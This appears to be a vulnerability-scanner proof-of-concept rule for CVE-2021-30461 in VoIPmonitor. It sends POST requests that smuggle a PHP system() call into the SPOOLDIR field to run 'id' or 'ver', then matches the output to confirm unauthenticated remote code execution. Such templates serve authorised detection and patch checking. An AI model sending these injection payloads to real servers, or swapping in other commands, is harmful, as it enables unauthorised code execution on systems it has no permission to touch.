name: poc-yaml-voipmonitor-cve-2021-30461-rce
manual: true
transport: http
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /index.php
            headers:
                Content-Type: application/x-www-form-urlencoded; charset=UTF-8
            body: SPOOLDIR=test%22.system%28id%29.%22&recheck=annen
        expression: |
            response.status == 200 && response.headers["Vary"] == "Accept-Encoding" && response.body_string.contains("uid=") && response.body_string.contains("gid=") && response.body_string.contains("VoIPmonitor installation")
    r1:
        request:
            cache: true
            method: POST
            path: /index.php
            headers:
                Content-Type: application/x-www-form-urlencoded; charset=UTF-8
            body: SPOOLDIR=test%22.system%28ver%29.%22&recheck=annen
        expression: |
            response.status == 200 && response.headers["Vary"] == "Accept-Encoding" && response.body_string.contains("Microsoft Windows") && response.body_string.contains("VoIPmonitor installation")
expression: r0() || r1()
detail:
    author: Editor
    links:
        - https://ssd-disclosure.com/ssd-advisory--voipmonitor-unauth-rce
    vulnerability:
        id: CT-154147
        level: critical
